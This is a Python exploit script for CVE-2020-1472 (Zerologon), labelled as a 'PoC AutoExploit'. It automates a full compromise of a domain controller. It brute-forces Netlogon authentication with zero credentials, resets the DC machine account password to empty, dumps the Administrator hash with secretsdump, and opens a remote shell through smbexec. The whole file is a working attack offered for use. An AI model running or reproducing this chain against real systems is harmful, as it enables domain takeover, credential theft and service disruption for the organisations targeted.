#!/usr/bin/env python3
#
# CVE-2020-1472 - Zerologon

from argparse import ArgumentParser
from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRENUM, NDRUNION, NDRPOINTER, NDRUniConformantArray, \
	NDRUniFixedArray, NDRUniConformantVaryingArray
from impacket.dcerpc.v5.dtypes import WSTR, LPWSTR, DWORD, ULONG, USHORT, PGUID, NTSTATUS, NULL, LONG, UCHAR, PRPC_SID, \
	GUID, RPC_UNICODE_STRING, SECURITY_INFORMATION, LPULONG

from impacket.dcerpc.v5.nrpc import *
from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time, os, re, random, string
from binascii import hexlify, unhexlify
from subprocess import check_call
from struct import pack, unpack
from impacket.smbconnection import SMBConnection

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

def fail(msg):
	print(msg, file=sys.stderr)
	print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
	sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
	# Connect to the DC's Netlogon service.
	binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
	rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
	rpc_con.connect()
	rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

	# Use an all-zero challenge and credential.
	plaintext = b'\x00' * 8
	ciphertext = b'\x00' * 8

	# Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
	flags = 0x212fffff

	# Send challenge and authentication request.
	nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
	try:
		server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\x00', ciphertext, flags)

		# It worked!
		assert server_auth['ErrorCode'] == 0
		return rpc_con

	except nrpc.DCERPCSessionError as ex:
	# Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
		if ex.get_error_code() == 0xc0000022:
			return None
		else:
			fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
	except BaseException as ex:
		fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
	# Keep authenticating until succesfull. Expected average number of attempts needed: 256.
	print("[!] CVE-2020-1472 PoC AutoExploit by PriviaSecurity\n")
	print('Performing authentication attempts...')
	rpc_con = None
	for attempt in range(0, MAX_ATTEMPTS):
		rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

		if rpc_con == None:
			print('\rAttempt: %d' % attempt, end='', flush=True)
		else:
			break

	if rpc_con:
		print('\nSuccess! DC can be fully compromised by a Zerologon attack. (attempt={})'.format(attempt))
	else:
		print('\nAttack failed. Target is probably patched.')
		sys.exit(1)

	return rpc_con


def get_authenticator(cred=b'\x00' * 8):
	authenticator = nrpc.NETLOGON_AUTHENTICATOR()
	authenticator['Credential'] = cred
	authenticator['Timestamp'] = 0
	return authenticator


class NetrServerPasswordSet2(NDRCALL):
	opnum = 30
	structure = (
		('PrimaryName', PLOGONSRV_HANDLE),
		('AccountName', WSTR),
		('SecureChannelType', NETLOGON_SECURE_CHANNEL_TYPE),
		('ComputerName', WSTR),
		('Authenticator', NETLOGON_AUTHENTICATOR),
		('ClearNewPassword', NL_TRUST_PASSWORD),
	)
	
class NetrServerPasswordSet2Response(NDRCALL):
	structure = (
		('ReturnAuthenticator', NETLOGON_AUTHENTICATOR),
		('ErrorCode', NTSTATUS),
	)


def passwordSet2(rpc_con, dc_name, target_account):
	dce = rpc_con

	if dce is None:
		return

	request = NetrServerPasswordSet2()
	request['PrimaryName'] = dc_name + '\x00'
	request['AccountName'] = target_account + '\x00'
	request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
	request['ComputerName'] = dc_name + '\x00'
	request['Authenticator'] = get_authenticator()
	
	clear = NL_TRUST_PASSWORD()
	clear['Buffer'] = b'\x00' * 516
	clear['Length'] = '\x00' * 4
	request['ClearNewPassword'] = clear

	try:
		print()
		resp = dce.request(request)
		print("[+] CVE-2020-1472 exploited\n")
	except Exception as e:
		raise
	dce.disconnect()


def get_shell(administrator_hash, dc_ip):
	service_name = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
	command = "smbexec.py -hashes %s Administrator@%s -service-name '%s'" % (administrator_hash, dc_ip, service_name)
	os.system(command)


def get_administrator_hash(dom_name, com_name, dc_ip):
	out_file = "out"
	command = "secretsdump.py -no-pass %s/'%s'@%s -just-dc-user Administrator" % (dom_name, com_name, dc_ip)
	os.system("%s > %s" % (command, out_file))
	out_contents = open(out_file, "r").read()
	administrator_hash = re.findall("Administrator:500:(.+)", out_contents)[0][:-3]
	return administrator_hash


def get_target_info(dc_ip):
	smb_conn = SMBConnection(dc_ip, dc_ip)
	try:
		smb_conn.login("", "")
		domain_name = smb_conn.getServerDNSDomainName()
		server_name = smb_conn.getServerName()
		return domain_name, server_name
	except:
		domain_name = smb_conn.getServerDNSDomainName()
		server_name = smb_conn.getServerName()
		return domain_name, server_name


def parse_args():
	parser = ArgumentParser(prog=ArgumentParser().prog,prefix_chars="-/",add_help=False,description='CVE-2020-1472 PoC AutoExploit by PriviaSecurity')
	parser.add_argument("dc_ip", help="Ip address of the domain controller", type=str)
	parser.add_argument('-h','--help',action='help', help='Show this help message and exit')
	args = parser.parse_args()
	return args


if __name__ == "__main__":
	args = parse_args()
	dc_ip = args.dc_ip
	dom_name, dc_name = get_target_info(dc_ip)
	com_name = dc_name + "$"
	rpc_con = perform_attack('\\\\' + dc_name, dc_ip, dc_name)
	passwordSet2(rpc_con, dc_name, com_name)
	rpc_con.disconnect()
	administrator_hash = get_administrator_hash(dom_name, com_name, dc_ip)
	get_shell(administrator_hash, dc_ip)
